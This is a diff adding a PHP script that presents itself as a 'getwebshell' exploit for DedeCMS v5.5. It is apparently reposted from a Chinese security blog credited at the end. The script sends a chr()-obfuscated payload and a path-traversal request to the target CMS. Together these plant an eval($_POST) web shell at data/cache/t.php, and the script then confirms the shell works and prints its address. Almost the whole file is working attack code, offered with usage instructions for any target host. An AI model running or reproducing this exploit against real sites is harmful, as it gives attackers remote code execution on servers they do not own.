@@ -1,0 +1,86 @@
+
+<?php
+print_r('
++----------------------------------------+
+dedecms v5.5 final getwebshell exploit
++----------------------------------------+
+');
+if ($argc < 3) {
+print_r('
++----------------------------------------+
+Usage: php '.$argv[0].' host path
+host: target server (ip/hostname)
+path: path to dedecms
+Example:
+php '.$argv[0].' localhost /dedecms/
++----------------------------------------+ 
+');
+exit;
+}
+error_reporting(7);
+ini_set('max_execution_time', 0);
+$host = $argv[1];
+$path = $argv[2];
+$post_a = 'plus/digg_ajax.php?id=1024e1024&*/fputs(fopen(chr(46).chr(46).chr(47).chr(100).chr(97).chr(116).chr(97).chr(47).chr(99).chr(97).chr(99).chr(104).chr(101).chr(47).chr(116).chr(46).chr(112).chr(104).chr(112),chr(119).chr(43)),chr(60).chr(63).chr(112).chr(104).chr(112).chr(32).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(39).chr(116).chr(39).chr(93).chr(41).chr(59).chr(63).chr(62));/*';
+$post_b = 'needCode=aa/../../../data/mysql_error_trace';
+$shell = 'data/cache/t.php';
+get_send($post_a);
+post_send('plus/comments_frame.php',$post_b);
+$content = post_send($shell,'t=echo tojen;');
+if(substr($content,9,3)=='200'){
+echo "\nShell Address is:".$host.$path.$shell;
+}else{
+echo "\nError.";
+}
+function get_send($url){
+global $host, $path;
+$message = "GET ".$path."$url HTTP/1.1\r\n";
+$message .= "Accept: */*\r\n";
+$message .= "Referer: http://$host$path\r\n";
+$message .= "Accept-Language: zh-cn\r\n";
+$message .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$message .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)\r\n";
+$message .= "Host: $host\r\n";
+$message .= "Connection: Close\r\n\r\n";
+$fp = fsockopen($host, 80);
+if(!$fp){
+echo "\nConnect to host Error";
+}
+fputs($fp, $message);
+
+$back = '';
+while (!feof($fp))
+$back .= fread($fp, 1024);
+fclose($fp);
+return $back;
+
+}
+function post_send($url,$cmd){
+
+global $host, $path;
+$message = "POST ".$path."$url HTTP/1.1\r\n";
+$message .= "Accept: */*\r\n";
+$message .= "Referer: http://$host$path\r\n";
+$message .= "Accept-Language: zh-cn\r\n";
+$message .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$message .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)\r\n";
+$message .= "Host: $host\r\n";
+$message .= "Content-Length: ".strlen($cmd)."\r\n";
+$message .= "Connection: Close\r\n\r\n";
+$message .= $cmd;
+$fp = fsockopen($host, 80);
+if(!$fp){
+echo "\nConnect to host Error";
+}
+fputs($fp, $message);
+
+$back = '';
+while (!feof($fp))
+$back .= fread($fp, 1024);
+fclose($fp);
+return $back;
+}
+?>
+本文来源于独自等待博客：http://www.waitalone.cn/ 原文地址：http://www.waitalone.cn/post/597.html 
+
+
